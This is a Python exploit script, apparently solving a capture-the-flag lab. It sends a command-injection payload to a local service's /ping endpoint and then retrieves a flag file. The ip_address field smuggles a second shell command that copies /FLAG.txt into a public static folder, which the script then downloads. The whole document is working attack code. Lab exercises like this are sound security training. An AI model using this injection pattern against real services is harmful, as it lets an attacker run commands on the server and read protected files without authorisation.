import requests

# Target base URL
base_url = "http://127.0.0.1:32814"

print("[*] Step 1: Sending command injection payload to /ping endpoint")
print("[*] Payload: ip_address=127.0.0.1; cp /FLAG.txt /app/static/flag_extracted.txt\n")

# Step 1: Send POST request with command injection payload
ping_url = f"{base_url}/ping"
payload = {
    "ip_address": "127.0.0.1; cp /FLAG.txt /app/static/flag_extracted.txt"
}

try:
    ping_response = requests.post(ping_url, data=payload, timeout=10)
    print(f"[+] POST {ping_url}")
    print(f"[+] Status: {ping_response.status_code} | Length: {len(ping_response.content)}B")
    print(f"[+] Response:\n{ping_response.text}\n")
except Exception as e:
    print(f"[-] Error during POST request: {e}\n")

# Step 2: Retrieve the extracted flag
print("[*] Step 2: Retrieving flag from /static/flag_extracted.txt\n")
flag_url = f"{base_url}/static/flag_extracted.txt"

try:
    flag_response = requests.get(flag_url, timeout=10)
    print(f"[+] GET {flag_url}")
    print(f"[+] Status: {flag_response.status_code} | Length: {len(flag_response.content)}B")
    print(f"[+] Response:\n{flag_response.text}\n")
    
    # Extract and print flag if found
    if "FLAG{" in flag_response.text:
        flag_content = flag_response.text.strip()
        print(f"[!] FLAG FOUND: {flag_content}")
    else:
        print("[-] No FLAG{} pattern found in response")
        
except Exception as e:
    print(f"[-] Error during GET request: {e}")

